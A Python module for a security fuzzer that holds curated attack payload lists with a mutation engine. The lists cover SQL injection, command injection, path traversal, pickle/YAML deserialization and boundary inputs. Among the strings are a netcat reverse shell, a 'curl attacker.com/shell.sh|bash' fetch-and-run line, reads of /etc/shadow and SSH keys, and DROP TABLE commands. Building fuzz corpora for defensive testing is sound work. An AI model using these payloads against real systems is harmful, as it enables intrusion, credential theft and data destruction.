"""
mutation_engine.py — Smart payload mutation library for KAVACH-AIDR fuzzer.

Contains domain-specific attack payloads for each vulnerability class.
These are used as seeds for fuzzing AND as inputs to prove exploitability.

Unlike random mutation, these payloads are semantically meaningful —
they target the exact patterns that make each vulnerability dangerous.
"""

from dataclasses import dataclass, field
from typing import Iterator
import random
import string
import itertools


@dataclass
class Payload:
    """A single fuzzing payload with metadata."""
    value       : str
    vuln_type   : str
    description : str
    severity    : str = "HIGH"   # How likely this is to trigger a crash/vuln


# ── Payload libraries ────────────────────────────────────────────────────────

SQL_INJECTION_PAYLOADS = [
    Payload("' OR '1'='1", "SQL_INJECTION", "Classic OR-based auth bypass"),
    Payload("' OR '1'='1' --", "SQL_INJECTION", "OR bypass with comment"),
    Payload("admin'--", "SQL_INJECTION", "Admin login bypass"),
    Payload("' UNION SELECT NULL,NULL,NULL--", "SQL_INJECTION", "UNION extraction"),
    Payload("' DROP TABLE users;--", "SQL_INJECTION", "Destructive DROP"),
    Payload("1; DROP TABLE users", "SQL_INJECTION", "Stacked query DROP"),
    Payload("' OR 1=1--", "SQL_INJECTION", "Numeric OR bypass"),
    Payload("\" OR \"1\"=\"1", "SQL_INJECTION", "Double-quote variant"),
    Payload("') OR ('1'='1", "SQL_INJECTION", "Bracket variant"),
    Payload("1' AND '1'='1", "SQL_INJECTION", "AND-based injection"),
    Payload("' UNION SELECT username,password FROM users--", "SQL_INJECTION", "Credential dump"),
    Payload("'; EXEC xp_cmdshell('whoami')--", "SQL_INJECTION", "MSSQL RCE"),
    Payload("' AND SLEEP(5)--", "SQL_INJECTION", "Time-based blind"),
    Payload("' AND 1=CONVERT(int,'a')--", "SQL_INJECTION", "Error-based blind"),
    Payload("x' OR 'x'='x", "SQL_INJECTION", "Generic bypass"),
]

COMMAND_INJECTION_PAYLOADS = [
    Payload("; ls -la", "COMMAND_INJECTION", "List files"),
    Payload("&& cat /etc/passwd", "COMMAND_INJECTION", "Read passwd"),
    Payload("| whoami", "COMMAND_INJECTION", "Current user"),
    Payload("`id`", "COMMAND_INJECTION", "Backtick execution"),
    Payload("$(id)", "COMMAND_INJECTION", "Subshell execution"),
    Payload("; rm -rf /tmp/test", "COMMAND_INJECTION", "File deletion"),
    Payload("\n/bin/sh", "COMMAND_INJECTION", "Newline injection"),
    Payload("127.0.0.1; cat /etc/shadow", "COMMAND_INJECTION", "Shadow file read"),
    Payload("localhost && nc -e /bin/sh 10.0.0.1 4444", "COMMAND_INJECTION", "Reverse shell"),
    Payload("a; python3 -c 'import os; os.system(\"id\")'", "COMMAND_INJECTION", "Python exec"),
    Payload("x|curl http://attacker.com/shell.sh|bash", "COMMAND_INJECTION", "Remote shell"),
    Payload("%0Awhoami", "COMMAND_INJECTION", "URL-encoded newline"),
]

PATH_TRAVERSAL_PAYLOADS = [
    Payload("../../../etc/passwd", "PATH_TRAVERSAL", "Unix passwd file"),
    Payload("..\\..\\..\\windows\\system32\\cmd.exe", "PATH_TRAVERSAL", "Windows cmd"),
    Payload("../../../../etc/shadow", "PATH_TRAVERSAL", "Shadow passwords"),
    Payload("../../../proc/self/environ", "PATH_TRAVERSAL", "Process env vars"),
    Payload("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "PATH_TRAVERSAL", "URL-encoded"),
    Payload("....//....//....//etc/passwd", "PATH_TRAVERSAL", "Double-slash bypass"),
    Payload("..%252f..%252f..%252fetc%252fpasswd", "PATH_TRAVERSAL", "Double URL-encode"),
    Payload("/etc/passwd%00.jpg", "PATH_TRAVERSAL", "Null byte bypass"),
    Payload("../../../var/log/auth.log", "PATH_TRAVERSAL", "Auth log"),
    Payload("../../../home/root/.ssh/id_rsa", "PATH_TRAVERSAL", "SSH private key"),
]

DESERIALIZATION_PAYLOADS = [
    # These are base64-encoded pickle payloads that execute os.system('id')
    # For testing purposes only — show that pickle is dangerous
    Payload("cos\nsystem\n(S'id'\ntR.", "DESERIALIZATION", "Pickle RCE: id command"),
    Payload("{__reduce__: evil}", "DESERIALIZATION", "Dict with __reduce__"),
    Payload("!!python/object/apply:os.system ['id']", "DESERIALIZATION", "YAML RCE"),
    Payload("yaml_dangerous_payload", "DESERIALIZATION", "Generic YAML injection"),
]

BOUNDARY_PAYLOADS = [
    Payload("", "BOUNDARY", "Empty string"),
    Payload(" ", "BOUNDARY", "Single space"),
    Payload("\x00", "BOUNDARY", "Null byte"),
    Payload("\n\r\t", "BOUNDARY", "Whitespace chars"),
    Payload("A" * 1000, "BOUNDARY", "Long string 1000"),
    Payload("A" * 10000, "BOUNDARY", "Long string 10000 (buffer overflow test)"),
    Payload("A" * 65536, "BOUNDARY", "Long string 64KB"),
    Payload("🔥" * 100, "BOUNDARY", "Unicode emoji"),
    Payload("\xff\xfe" * 100, "BOUNDARY", "High-byte binary"),
    Payload("-1", "BOUNDARY", "Negative integer"),
    Payload("2147483648", "BOUNDARY", "Int32 overflow"),
    Payload("9999999999999999999", "BOUNDARY", "Large integer"),
    Payload("0", "BOUNDARY", "Zero"),
    Payload("None", "BOUNDARY", "Python None string"),
    Payload("true", "BOUNDARY", "Boolean string"),
]


class MutationEngine:
    """
    Smart payload mutation engine.

    Provides:
    1. Static payloads — curated attack strings per vulnerability type
    2. Mutation — transform existing payloads with common bypasses
    3. Cross-breeding — combine payloads for complex attacks
    4. Random generation — boundary and edge case values
    """

    PAYLOAD_DB = {
        "SQL_INJECTION"     : SQL_INJECTION_PAYLOADS,
        "COMMAND_INJECTION" : COMMAND_INJECTION_PAYLOADS,
        "PATH_TRAVERSAL"    : PATH_TRAVERSAL_PAYLOADS,
        "DESERIALIZATION"   : DESERIALIZATION_PAYLOADS,
        "BOUNDARY"          : BOUNDARY_PAYLOADS,
    }

    def get_payloads(self, vuln_type: str) -> list[Payload]:
        """Get all static payloads for a given vulnerability type."""
        base = self.PAYLOAD_DB.get(vuln_type, [])
        # Always include boundary payloads for comprehensive testing
        boundary = BOUNDARY_PAYLOADS
        return base + boundary

    def mutate(self, payload: Payload, n: int = 5) -> list[Payload]:
        """
        Apply mutation operators to an existing payload to produce variants.
        Mimics what a fuzzer does but with security-aware mutations.
        """
        mutations = []
        val = payload.value

        # Case variation
        mutations.append(Payload(val.upper(), payload.vuln_type, f"{payload.description} [UPPER]"))
        mutations.append(Payload(val.lower(), payload.vuln_type, f"{payload.description} [lower]"))

        # URL encoding
        url_encoded = val.replace("'", "%27").replace('"', "%22").replace(" ", "%20")
        mutations.append(Payload(url_encoded, payload.vuln_type, f"{payload.description} [URL-encoded]"))

        # Double URL encoding
        double_encoded = url_encoded.replace("%", "%25")
        mutations.append(Payload(double_encoded, payload.vuln_type, f"{payload.description} [double-encoded]"))

        # Null byte injection
        mutations.append(Payload(val + "\x00", payload.vuln_type, f"{payload.description} [+null]"))

        # Prefix/suffix
        mutations.append(Payload("a" + val, payload.vuln_type, f"{payload.description} [prefixed]"))
        mutations.append(Payload(val + " ", payload.vuln_type, f"{payload.description} [trailing space]"))

        # Comment variations for SQL
        if payload.vuln_type == "SQL_INJECTION":
            for comment in ["--", "#", "/**/", "/*!*/"]:
                mutations.append(Payload(val + comment, "SQL_INJECTION", f"SQL [+{comment}]"))

        return mutations[:n]

    def generate_random_strings(self, n: int = 10) -> list[Payload]:
        """Generate random boundary test strings."""
        payloads = []
        for _ in range(n):
            length = random.choice([0, 1, 10, 100, 255, 256, 1000])
            chars  = random.choice([
                string.ascii_letters,
                string.digits,
                string.punctuation,
                string.printable,
            ])
            val = "".join(random.choices(chars, k=length))
            payloads.append(Payload(val, "BOUNDARY", f"Random {length}-char string"))
        return payloads

    def iter_all_for_vuln(self, vuln_type: str) -> Iterator[Payload]:
        """
        Iterate all payloads + their mutations for a given vuln type.
        Used by the fuzzer runner as a comprehensive seed corpus.
        """
        static = self.get_payloads(vuln_type)
        for p in static:
            yield p
            yield from self.mutate(p, n=3)
        yield from self.generate_random_strings(n=10)
